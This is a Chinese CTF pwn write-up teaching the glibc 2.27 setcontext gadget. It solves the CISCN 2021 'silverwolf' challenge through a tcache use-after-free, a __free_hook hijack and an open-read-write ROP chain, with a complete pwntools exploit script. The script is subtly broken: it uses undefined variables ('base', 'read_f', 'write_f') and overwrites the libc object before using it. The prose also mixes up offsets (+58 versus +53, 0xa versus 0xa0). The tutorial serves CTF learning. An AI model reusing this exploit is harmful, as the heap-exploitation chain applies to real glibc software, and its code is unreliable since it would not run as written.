0x00 前言
=======

越来越卷，只能这么说了，现在高版本下的利用方式越来越难，甚至有的比赛直接算是全部上kernel。然后新手小白感到这个年代的pwn手并不适合生存。算了，比赛是比赛，总之还是需要生活的。于是浏览了许多大佬的博客发现讲的并不是很详细于是想自己动手，在大佬给出利用调用链的基础下进行一个利用的详细讲解。大部分高版本的House系列现在都配上了现在比较主流的Largebin Attack以及Tcache Stashing Unlink Attack，还有setcontext的一些gadget的利用、由于很卷所以就有了一些沙箱的然后进行orw出flag。这样的话初步想法是本文先进行讲解setcontext的利用。在网上的资料讲解的不是很详细，起码对于我如此小白的人来说是非常难理解的，所以我想写下一篇比较详细的文章来讲解并且可以造福更多的人。

0x02 故事的开始
==========

故事的开始是我在复现21年的国赛的时候，当时21年国赛的时候我们还没有怎么学pwn似乎是只会ret2text的样子。然后之前复现的时候发现这道题说了一句setcontex+58，我也不知是什么然后复现的时候只是跟着走。在之后的比赛里面也是找到了类似的东西似乎还是去学习一下比较好。

0x03 原理
=======

首先讲解libc2.27下的setcontext吧

用ida打开libc-2.27.so找到setcontext函数，发现setcontext里面都是以rdi寄存器为索引向各种寄存器里面进行传输数值，如果我们能控制rdi的内容的话就会很轻松的控制其他寄存器。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-1516b7b4af28bafd8baa999553c8b79c39356668.png)

至于我们前面提到的setcontext+53就是从rdi索引向各寄存器传输数值的那一行这样的话一直到结束我们就可以根基偏移布置好相应的数值控制各寄存器。我们在上面看到了rsp，这是非常关键的，如果控制了rsp也就是控制了栈。

还有我之前没有注意到的一个地方，是在\_\_lifanxin大佬的博客中发现的：

修改rcx的值后接着有个push操作将rcx压栈，然后汇编指令按照顺序会执行截图中最后的retn操作，而retn的地址就是压入栈的rcx值，因此修改rcx就获得了控制程序流程的能力。

0x04 利用方法
=========

利用方法的话就是利用我们熟悉的**free\_hook还有\_\_malloc\_hook，就像我们平时利用这两个hook写og getshell的时候。我们一般来利用setcontext都是利用**free\_hook进行调用因为free的参数是堆块，而malloc的参数是数字，这样的话使用free来的更快。

劫持栈地址
-----

我们看到gadget中的rsp，是我们劫持栈的关键：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-1ab5d6edc1bd613ffb538b8f9d911153c34d2e0f.png)

可见是将rdi+0xa0处的内容放入rsp寄存器，也可以这么理解。在可以执行setcontext的条件下，假如能够控制rdi+0xa地方的内容也就是有了控制rsp的能力，即控制栈的能力。

劫持返回地址
------

我们再看：

先是一段将rdi+0xe0的数据传递给rcx，下面又有一个将rcx压入栈的操作，再最后是有retn的，那么就相当于只要是控制rdi+0xe0就相当于控制了程序的执行流

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-0a433a95ae4f51275862488352c94edb29995181.png)

0x05 利用场景
=========

setcontext一般利用于需要绕过沙箱机制进行orw的时候，将程序流劫持到构造的orw链中去 ,构造的时候也比较方便只需要在rdi堆块下面固定偏移的范围内进行布置数据。（要找好偏移。

0x06 题目练习
=========

题目：ciscn\_2021\_silverwolf

环境：ubuntu18.04

glibc版本：Ubuntu GLIBC 2.27-3ubuntu1.3

例行检查
----

64位全绿

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-2f2a653a418cfded59ab752a2642daa2cb6ad62b.png)

这个版本没有doublefree的检测，增查删改，有uaf

利用思路
----

利用df泄露heap地址，再利用df将堆块申请到控制head，将其分配至unsortedbin中，然后show泄露libc地址。之后修改tcache的堆指针劫持freehook，还有其他大小堆块布置好相应堆块，利用setcontext进行调用执行orw

leak\_heap\_libc
----------------

这两个都是源自于lonlywolf的利用方式，这里放出过程

```python
###############leak_heap
add(0x30)
delete()
edit("a"*0x10)
delete()
show()
heap = u64(ru("\n").ljust(8, b"\x00"))
heap_base = heap-0x1920
print("heap base: ", hex(heap_base))
#########hijack_tcache_head
head = heap_base+0x10
add(0x30)
edit(p64(head))
add(0x30)
add(0x30)
#############leak_libc
str = p64(0)*4+p64(0x00000000ff000000)
edit(str)
delete()
show()
libc = u64(ru("\n").ljust(8, b"\x00"))
libc_base = libc-0x70-libc.sym["__malloc_hook"]
setcontext = libc_base+libc.sym["setcontext"]+53
free_hook = libc_base+libc.sym["__free_hook"]
print("libc base: ", hex(libc_base))
print("setcontext_53: ", hex(setcontext))
print("free_hook: ", hex(free_hook))
```

构造orw
-----

没啥说的，就是构造。

```python
flag_addr = heap_base+0x2000

pop_rax_ret = base+0x000000000001ced0
pop_rdi_ret = base+0x000000000002144f
pop_rsi_ret = base+0x0000000000021e22
pop_rdx_ret = base+0x0000000000001b96
read = base+libc.sym["read"]
write = base+libc.sym["write"]
syscall = read_f+0xf#程序中找不到open，就利用系统调用

orw = p64(pop_rdi_ret)+p64(flag_addr)
orw += p64(pop_rsi_ret)+p64(0)
orw += p64(pop_rax_ret)+p64(2)
orw += p64(syscall)
orw += p64(pop_rdi_ret)+p64(3)
orw += p64(pop_rsi_ret)+p64(flag_addr)
orw += p64(pop_rdx_ret)+p64(0x30)
orw += p64(read_f)
orw += p64(pop_rdi_ret)+p64(1)
orw += p64(pop_rsi_ret)+p64(flag_addr)
orw += p64(pop_rdx_ret)+p64(0x30)
orw += p64(write_f)
```

根据setcontext进行构造
----------------

### tcache\_head

在进行布置的时候为了更好的去利用，官方的wp中hijack了tcache\_perthread\_struct，那么我们就看一下tcache\_perthread\_struct的结构：

```c
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];//数组长度64，每个元素最大为0x7，仅占用一个字节（对应64个tcache链表）
  tcache_entry *entries[TCACHE_MAX_BINS];//entries指针数组（对应64个tcache链表，cache bin中最大为0x400字节
  //每一个指针指向的是对应tcache_entry结构体的地址。
} tcache_perthread_struct;
```

我们看到上面的结构体里面，在counts之后存在tcache链的指针，指向每一个大小的tcache链的下一个堆块的fd。也就是意味着我们只要劫持了这里的指针我们就能实现任意地址分配堆块。这里的布置利用的就是这个结构体中的指针。

### 布置

在布置的时候我们可以选择一个堆块为参数，就是以这个堆块的地址作为rdi，布置数据要根据此参数作为索引。

首先我们要先把堆块分配到tcache\_entry的位置

```python
add(0x48)
edit(p64(0)*9)
for i in range(5):
    add(0x10)
add(0x18)
edit(p64(heap_base+0x50))#修改tcache的fd指针到tcache_entry
add(0x38)#申请到tcache_entry
```

剩下的就是对tcache\_entry中的指针进行布置了

```python
orw_addr = heap_base+0x1000#挑个纯净的环境放置orw链

payload = p64(free_hook)#这里是0x20大小堆块的下一个堆块的指针，意味着我们再申请一个0x20大小的堆块就分配到了free_hook
payload += p64(heap_base+0x2000)#这里是0x30大小堆块的下一个堆块的指针,这是作为rdi的堆块
payload += p64(heap_base+0x20A0)#rdi+0xa0这里布置的应该是需要劫持的栈地址
payload += p64(heap_base+0x2000)#0x50
payload += p64(orw_addr+0x60) + p64(orw_addr)#0x60和0x70放我们的prw链，因为比较长所以需要放两个堆块
payload += p64(0)
edit(payload)#写入
```

下面就是着手要实施了

```python
add(0x10)
edit(p64(setcontext))#劫持free_hook修改为free_hook

add(0x20)
edit("./flag\x00")#作为filename

add(0x30)
pl = p64(orw_addr) + p64(pop_rdi_ret+1)#用来控制rsp
edit(pl)

add(0x60)
edit(orw[:0x60])
add(0x50)
edit(orw[0x60:])#布置上orw链

delete()#触发
```

完整EXP
-----

```python
#encoding = utf-8
import os
import sys
import time
from pwn import *
from LibcSearcher import * 

context.log_level = "debug"
context.os = 'linux'
context.arch = 'amd64'

binary = "silverwolf"
libcelf = "libc-2.27.so"
ip = ""
port = ""
local = 1
arm = 0
core = 64

og = [0x4342,0x3342]

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\x00'))
uu64    = lambda data               :u64(data.ljust(8,'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

if(local==1):
    if(arm==1):
        if(core==64):
            p = process(["qemu-arm", "-g", "1212", "-L", "/usr/arm-linux-gnueabi",binary])
        if(core==32):
            p = process(["qemu-aarch64", "-g", "1212", "-L", "/usr/aarch64-linux-gnu/", binary])
    else:
        p = process(binary)
else:
    p = remote(ip,port)

elf = ELF(binary)
libc = ELF(libcelf)

def choice(cho):
    sla('Your choice: ',cho)

def add(size):
    choice(1)
    sla('Index: ','0')
    sla('Size: ',size)

def delete():
    choice(4)
    sla('Index: ','0')

def show():
    choice(3)
    sla('Index: ','0')

def edit(content):
    choice(2)
    sla('Index: ','0')
    sla('Content: ',content) 

def pwn():
    add(0x30)
    delete()
    edit("a"*0x10)
    delete()
    show()
    heap = u64(ru("\n").ljust(8, b"\x00"))
    heap_base = heap-0x1920
    print("heap base: ", hex(heap_base))

    head = heap_base+0x10
    add(0x30)
    edit(p64(head))
    add(0x30)
    add(0x30)

    str = p64(0)*4+p64(0x00000000ff000000)
    edit(str)
    delete()
    show()
    libc = u64(ru("\n").ljust(8, b"\x00"))
    libc_base = libc-0x70-libc.sym["__malloc_hook"]
    setcontext = libc_base+libc.sym["setcontext"]+53
    free_hook = libc_base+libc.sym["__free_hook"]
    print("libc base: ", hex(libc_base))
    print("setcontext_53: ", hex(setcontext))
    print("free_hook: ", hex(free_hook))

    flag_addr = heap_base+0x2000

    pop_rax_ret = base+0x000000000001ced0
    pop_rdi_ret = base+0x000000000002144f
    pop_rsi_ret = base+0x0000000000021e22
    pop_rdx_ret = base+0x0000000000001b96
    read = base+libc.sym["read"]
    write = base+libc.sym["write"]
    syscall = read_f+0xf

    orw = p64(pop_rdi_ret)+p64(flag_addr)
    orw += p64(pop_rsi_ret)+p64(0)
    orw += p64(pop_rax_ret)+p64(2)
    orw += p64(syscall)
    orw += p64(pop_rdi_ret)+p64(3)
    orw += p64(pop_rsi_ret)+p64(flag_addr)
    orw += p64(pop_rdx_ret)+p64(0x30)
    orw += p64(read_f)
    orw += p64(pop_rdi_ret)+p64(1)
    orw += p64(pop_rsi_ret)+p64(flag_addr)
    orw += p64(pop_rdx_ret)+p64(0x30)
    orw += p64(write_f)

    add(0x48)
    edit(p64(0)*9)
    for i in range(5):
        add(0x10)
    add(0x18)
    edit(p64(heap_base+0x50))
    add(0x38)

    orw_addr = heap_base+0x1000

    payload = p64(free_hook)
    payload += p64(heap_base+0x2000)
    payload += p64(heap_base+0x20A0)
    payload += p64(heap_base+0x2000)
    payload += p64(orw_addr+0x60) + p64(orw_addr)
    payload += p64(0)
    edit(payload)

    add(0x10)
    edit(p64(setcontext))

    add(0x20)
    edit("./flag\x00")

    add(0x30)
    pl = p64(orw_addr) + p64(pop_rdi_ret+1)
    edit(pl)

    add(0x60)
    edit(orw[:0x60])
    add(0x50)
    edit(orw[0x60:])

    delete()
    itr()

#爆破
'''
i = 0
while 1:
    i += 1
    log.warn(str(i))
    try:  
        pwn()
    except Exception:
        p.close()
        if(local == 1):
            p = process(binary)
        else:
            p = remote(ip,port)
        continue
'''

if __name__ == '__main__':
    pwn()
```

0x07 高版本GLIBC-SETCONTEXT的变化
===========================

在GLIBC版本为2.29开始，setcontext的索引就从rdi改成了rdx

如图：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-9d62001f63645f4dd7a3b7cff4c08b03d0cf1ebf.png)

如果我们按照之前的思路的话，需要我们先通过ROP控制RDX的值。众所周知利用gadget控制rdx的寄存器比较困难。那么这样的话我们需要找到一些比较方便的gadget去间接控制rdx寄存器。

gadget
------

第一个是getkeyserv\_handle+576

可以通过这个gadget通过rdi来控制rdx寄存器（适用版本为Glibc2.29到2.32

```python
mov     rdx, [rdi+8]
mov     [rsp+0C8h+var_C8], rax
call    qword ptr [rdx+20h]
```

0x08 后记
=======

总结下利用的方法来巩固自己的知识，也希望能帮助到像我一样迷茫的人。如有错误请斧正。

0x09 参考链接：
==========

[(9条消息) pwn题堆利用的一些姿势 -- setcontext\_\_\_lifanxin的博客-CSDN博客](https://blog.csdn.net/A951860555/article/details/118268484)

[(9条消息) 2021第十四届全国大学生信息安全竞赛WP（CISCN）-- pwn部分\_\_\_lifanxin的博客-CSDN博客\_信息安全国赛](https://blog.csdn.net/A951860555/article/details/116910945)

[(9条消息) tcache的利用方法\_qq\_39869547的博客-CSDN博客\_tcache](https://blog.csdn.net/qq_39869547/article/details/102765092)

[PWN堆溢出技巧：ORW的解题手法与万金油Gadgets - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/236832)